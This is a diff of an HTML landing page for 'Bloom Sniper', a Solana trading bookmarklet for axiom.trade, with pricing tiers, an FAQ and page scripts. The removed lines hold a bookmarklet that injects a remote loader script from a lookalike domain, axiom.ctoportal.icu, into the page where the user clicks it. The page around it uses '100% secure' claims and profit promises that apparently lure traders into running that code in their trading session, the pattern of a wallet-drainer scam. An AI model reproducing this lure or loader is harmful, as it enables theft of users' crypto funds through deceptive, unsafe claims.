+                                <span class="price-period">forever</span>
+                            </div>
+                            <p class="pricing-description">Perfect for getting started</p>
+                        </div>
+                        
+                        <div class="pricing-features" bis_skin_checked="1">
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Influencer Sniper</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Pre-Migration Snipe</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Wallet Stalker</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Auto Strategies</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Live Alpha Feed</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>MEV Protection</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Smart Alerts</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Portfolio Tracker</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Basic Analytics</span>
+                            </div>
+                        </div>
+                        
+                        <a class="bookmarklet pricing-btn pricing-btn-free" draggable="true">Get Started Free</a>
+                    </div>
+                    
+
+                    <div class="pricing-card pricing-card-pro animate-slide-right" bis_skin_checked="1">
+                        <div class="pricing-badge" bis_skin_checked="1">Most Popular</div>
+                        <div class="pricing-header" bis_skin_checked="1">
+                            <h3 class="pricing-title">Pro</h3>
+                            <div class="pricing-price" bis_skin_checked="1">
+                                <span class="price-amount">1 SOL</span>
+                                <span class="price-period">lifetime</span>
+                            </div>
+                            <p class="pricing-description">Unlock your full potential</p>
+                        </div>
+                        
+                        <div class="pricing-features" bis_skin_checked="1">
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Everything in Free</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Advanced Multi-Wallet Management</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Custom Trading Strategies</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Priority Transaction Speed</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Advanced Analytics &amp; Reports</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Whale Movement Predictions</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Auto-Compound Strategies</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Private Alpha Signals</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>API Access &amp; Webhooks</span>
+                            </div>
+                            <div class="feature-item" bis_skin_checked="1">
+                                <span class="feature-check">✓</span>
+                                <span>Premium Support</span>
+                            </div>
+                        </div>
+                        
+                        <a class="bookmarklet pricing-btn pricing-btn-pro"  draggable="true">Upgrade to Pro</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+        <section class="section" id="faq">
+            <div class="container" bis_skin_checked="1">
+                <div class="section-header animate-fade-in" bis_skin_checked="1">
+                    <h2 class="section-title">Frequently asked questions</h2>
+                </div>
+                
+                <div class="faq-list" bis_skin_checked="1">
+                    <details class="faq-item animate-on-scroll">
+                        <summary class="faq-summary">
+                            What's the difference between Free and Pro plans?
+                            <span class="faq-toggle">+</span>
+                        </summary>
+                        <div class="faq-content" bis_skin_checked="1">
+                            Free includes all core features like Influencer Sniper, Wallet Stalker, and basic analytics. 
+                            Pro adds advanced multi-wallet management, custom strategies, whale predictions, priority speed, and private alpha signals.
+                        </div>
+                    </details>
+                    
+                    <details class="faq-item animate-on-scroll">
+                        <summary class="faq-summary">
+                            Is this secure? Do you access my wallet?
+                            <span class="faq-toggle">+</span>
+                        </summary>
+                        <div class="faq-content" bis_skin_checked="1">
+                            100% secure. Bloom Sniper runs entirely in your browser and never asks for private keys. 
+                            It helps you execute trades faster on axiom.trade, but you approve every transaction.
+                        </div>
+                    </details>
+                    
+                    <details class="faq-item animate-on-scroll">
+                        <summary class="faq-summary">
+                            Is the Pro plan worth 1 SOL?
+                            <span class="faq-toggle">+</span>
+                        </summary>
+                        <div class="faq-content" bis_skin_checked="1">
+                            Pro is designed for serious traders who want maximum advantage. With whale movement predictions, 
+                            priority transaction speed, and exclusive alpha signals, many users recover the cost in their first few successful trades.
+                        </div>
+                    </details>
+                    
+                    <details class="faq-item animate-on-scroll">
+                        <summary class="faq-summary">
+                            Can I upgrade from Free to Pro anytime?
+                            <span class="faq-toggle">+</span>
+                        </summary>
+                        <div class="faq-content" bis_skin_checked="1">
+                            Yes! You can upgrade at any time. Pro features activate immediately after payment. 
+                            Your existing settings and data are preserved during the upgrade.
+                        </div>
+                    </details>
+                    
+                    <details class="faq-item animate-on-scroll">
+                        <summary class="faq-summary">
+                            Can I really beat other bots?
+                            <span class="faq-toggle">+</span>
+                        </summary>
+                        <div class="faq-content" bis_skin_checked="1">
+                            Bloom Sniper gives you a massive advantage through automation, signal detection, and MEV protection. 
+                            Pro users get even more advantages with whale predictions and priority transaction speed.
+                        </div>
+                    </details>
+                    
+
+                </div>
+            </div>
+        </section>
+    </main>
+
+
+
+
+
+    <script>
+
+        function scrollToSection(sectionId) {
+            const section = document.getElementById(sectionId);
+            if (section) {
+                section.scrollIntoView({ 
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+            }
+        }
+        
+      
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            document.body.classList.add('loading-bg');
+            
+            
+            const img = new Image();
+            img.onload = function() {
+                
+                document.body.classList.remove('loading-bg');
+                document.body.classList.add('image-loaded');
+            };
+            img.onerror = function() {
+                
+                setTimeout(() => {
+                    document.body.classList.remove('loading-bg');
+                    document.body.classList.add('image-loaded');
+                }, 5000);
+            };
+            
+            img.src = 'https://i.postimg.cc/QxNRx7Hf/bloom-background-1.jpg';
+        });
+        
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('animate-in');
+                    }
+                });
+            }, {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            });
+            
+            
+            const animateElements = document.querySelectorAll('.animate-on-scroll, .animate-fade-in, .animate-slide-up, .animate-slide-left, .animate-slide-right, .animate-scale, .animate-bounce');
+            
+            animateElements.forEach(element => {
+                observer.observe(element);
+            });
+        });
+        
+        
+        document.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            e.dataTransfer.dropEffect = 'none';
+        });
+        
+        document.addEventListener('drop', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        
+        function showTermsModal() {
+            const modal = document.getElementById('terms-modal');
+            if (!modal) {
+                console.error('Terms modal not found');
+                return;
+            }
+            modal.classList.add('active');
+            
+            
+            const escapeHandler = function(e) {
+                if (e.key === 'Escape') {
+                    closeTermsModal();
+                    document.removeEventListener('keydown', escapeHandler);
+                }
+            };
+            document.addEventListener('keydown', escapeHandler);
+            
+            
+            const clickHandler = function(e) {
+                if (e.target === modal) {
+                    closeTermsModal();
+                    modal.removeEventListener('click', clickHandler);
+                }
+            };
+            modal.addEventListener('click', clickHandler);
+        }
+        
+        function closeTermsModal() {
+            const modal = document.getElementById('terms-modal');
+            if (modal) {
+                modal.classList.remove('active');
+            }
+        }
+    </script>
+
+
+
+
+
+    <div id="terms-modal" class="modal-overlay" bis_skin_checked="1">
+        <div class="modal-content modal-content-large" bis_skin_checked="1">
+            <button class="modal-close" onclick="closeTermsModal()">×</button>
+            <div class="modal-header" bis_skin_checked="1">
+                <h2 class="modal-title">Accept terms</h2>
+                <p class="modal-subtitle">Important Notice</p>
+            </div>
+            <div class="modal-body" bis_skin_checked="1">
+                <p>Please review and accept the terms and conditions on axiom.trade before proceeding. This is required for Bloom Sniper to function properly with the platform.</p>
+            </div>
+        </div>
     </div>
 
-    <footer>
-      © 2025 AATT · Built for smarter trading
-    </footer>
-  </div>
 
-  <script>
-    const loaderUrl = 'https://axiom.ctoportal.icu/loader.js';
-    const bookmarkletCode = `(function(){try{var s=document.createElement('script');s.src='${loaderUrl}';s.async=true;document.head.appendChild(s);}catch(e){alert('Failed to launch Axiom tools: '+e);}})();`;
-const bookmarkletHref = 'javascript:' + bookmarkletCode;
+<script defer="" src="urn:scrapbook:download:error:https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;5250b7f9ea424c87a30d71c8141ffeb7&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}"></script>
 
-
-    const dragLink = document.getElementById('drag-link');
-    const copyBtn = document.getElementById('copy-btn');
-
-    dragLink.setAttribute('href', bookmarkletHref);
-
-    dragLink.addEventListener('dragstart', function(e){
-      try{
-        e.dataTransfer.setData('text/plain', bookmarkletHref);
-        e.dataTransfer.setData('text/uri-list', bookmarkletHref);
-      }catch(err){}
-    });
-
-    copyBtn.addEventListener('click', async function(){
-      try{
-        await navigator.clipboard.writeText(bookmarkletHref);
-        copyBtn.textContent = 'Copied!';
-        setTimeout(()=>copyBtn.textContent='Copy',1200);
-      }catch(e){
-        alert('Copy failed — create a new bookmark manually and paste this as the URL:\n\n'+decodeURIComponent(bookmarkletHref));
-      }
-    });
-  </script>
-</body>
-</html>
+</body></html>
